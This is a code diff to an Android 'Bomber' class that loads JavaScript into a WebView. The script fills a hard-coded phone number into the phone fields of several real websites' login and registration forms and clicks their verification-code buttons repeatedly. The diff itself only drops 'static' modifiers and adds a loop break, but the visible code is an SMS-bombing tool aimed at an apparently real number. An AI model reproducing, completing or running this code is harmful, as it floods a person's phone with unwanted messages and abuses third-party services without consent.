@@ -14,7 +14,7 @@ import android.webkit.WebViewClient;
 
 public class Bomber extends Thread{
 
-	static String js[] = {
+	String js[] = {
 			"javascript:var ele = document.getElementById(\"mem-tel\");"+"ele.value = 13538805451;"		//1
 			+"var ele = document.getElementById(\"get-code\");" +"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();"+"ele.click();",
 			"javascript:var ele = document.getElementById(\"restphone\");"+"ele.value = 13538805451;"		//2
@@ -70,7 +70,7 @@ public class Bomber extends Thread{
 			
 
 	};
-	static String url[] = {
+	String url[] = {
 			"http://www.souche.com/pages/minilogin.html",		//1
 			"http://user.migu.cn/register/index.action",		//2
 			"http://beijing.lashou.com/account/signmobile/",		//3
@@ -137,7 +137,7 @@ public class Bomber extends Thread{
 				flag++;
 				i = 0;
 				if(flag >= 5){
-					
+					break;
 				}
 			}
 		}
